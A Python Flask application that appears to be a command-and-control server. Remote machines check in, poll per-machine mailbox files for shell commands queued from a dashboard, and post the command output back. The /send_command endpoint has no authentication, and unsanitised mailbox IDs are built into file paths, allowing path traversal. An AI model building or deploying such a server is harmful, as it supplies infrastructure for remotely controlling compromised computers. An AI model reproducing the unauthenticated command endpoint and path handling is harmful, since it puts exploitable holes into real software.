from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import psycopg2, os

app = Flask(__name__)
# Secure secret key pattern
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "local-dev-fallback-key-123")

# Define db_url globally so the startup block can read it safely
db_url = os.environ.get("DATABASE_URL")

def init_db():
    if not db_url:
        return
    conn = psycopg2.connect(db_url)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS checkins (
            machine_id TEXT PRIMARY KEY,
            hostname TEXT,
            os TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_db_connection():
    """Helper function to cleanly open a connection to PostgreSQL"""
    return psycopg2.connect(db_url)

@app.route('/', methods=["GET", "POST"])
def login():
    message = ""
    if request.method == "POST":
        password = request.form["password"]
        username = request.form["username"]

        # Fixed: Username and password checks were flipped in your previous version
        expected_user = os.environ.get("DASHBOARD_USER", "admin")
        expected_pass = os.environ.get("DASHBOARD_PASS", "local-test-password")

        if username == expected_user and password == expected_pass:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            message = "Wrong Password!"
    return render_template('login.html', message=message)

@app.route('/dashboard')
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template('dashboard.html')

@app.route('/dashboard/machines')
def machines():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    if not db_url:
        return "Database not configured locally.", 500

    # Fixed: Changed from sqlite3 to psycopg2
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT machine_id, hostname, os FROM checkins')
    rows = cursor.fetchall()
    conn.close()
    
    machines_dict = {}
    for row in rows:
        # Grabbing columns explicitly by position so it never breaks
        m_id = row[0]
        hostname = row[1]
        os_type = row[2]
        
        machines_dict[m_id] = {
            "hostname": hostname,
            "os": os_type
        }
    
    return render_template('machines.html', machines=machines_dict)

@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.get_json()

    if not data:
        return "Bad Request", 400
        
    machine_id = data.get('machine_id')
    hostname = data.get('hostname')
    os_type = data.get('os')

    if not db_url:
        return "Database not configured", 500

    # Fixed: Changed from sqlite3 to psycopg2 and updated query syntax for Postgres
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO checkins (machine_id, hostname, os)
        VALUES (%s, %s, %s)
        ON CONFLICT(machine_id) DO UPDATE SET 
            hostname = EXCLUDED.hostname, 
            os = EXCLUDED.os
    ''', (machine_id, hostname, os_type))
    
    conn.commit()
    conn.close()
    
    print(f"[*] Successfully recorded check-in for machine: {hostname}")
    return "OK", 200

@app.route('/dashboard/command')
def command():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    mailbox_id = request.args.get('mailbox_id', '')
    hostname = request.args.get('hostname', 'MGC2')
    return render_template('command.html', mailbox_id=mailbox_id, hostname=hostname)

@app.route('/mailbox/<mailbox_id>', methods=['GET'])
def get_command(mailbox_id):
    try:
        with open(f"mailbox_{mailbox_id}.txt", "r") as file:
            lines = file.readlines()
            if lines:
                current_command = lines[-1].strip()
                return current_command, 200, {'Content-Type': 'text/plain'}
            else:
                return "NONE", 200, {'Content-Type': 'text/plain'}
    except FileNotFoundError:
        return "NONE", 200, {'Content-Type': 'text/plain'}

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    command = data.get('cmd')
    mailbox_id = data.get('mailbox_id')
    
    with open(f"mailbox_{mailbox_id}.txt", "w") as file:
        file.write(f"{command}\n")
        
    return jsonify({"status": "success"})

@app.route('/mailbox/<mailbox_id>/output', methods=['POST'])
def receive_output(mailbox_id):
    data = request.get_json()
    command_output = data.get('output', '')

    if not db_url:
        return jsonify({"status": "error", "message": "No DB configured"}), 500

    # Save the output directly into the database row for this machine!
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE checkins 
        SET os = %s 
        WHERE machine_id = %s
    ''', (command_output, mailbox_id))
    
    conn.commit()
    cursor.close()
    conn.close()

    # Create a blank temporary file just to clear out the current command file
    with open(f"mailbox_{mailbox_id}.txt", "w") as file:
        file.write("NONE\n")

    return jsonify({"status": "success"})

@app.route('/get_output/<mailbox_id>', methods=['GET'])
def get_output(mailbox_id):
    try:
        with open(f"output_{mailbox_id}.txt", "r") as file:
            content = file.read()
            return jsonify({"output": content})
    except FileNotFoundError:
        return jsonify({"output": "Waiting for machine execution..."})

if __name__ == "__main__":
    # Fixed: db_url is now safely checked because it's defined at the top
    if db_url:
        print("[*] Database URL found. Initializing PostgreSQL database...")
        init_db()
    else:
        print("[!] No DATABASE_URL found. Skipping database initialization for local testing.")
        
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
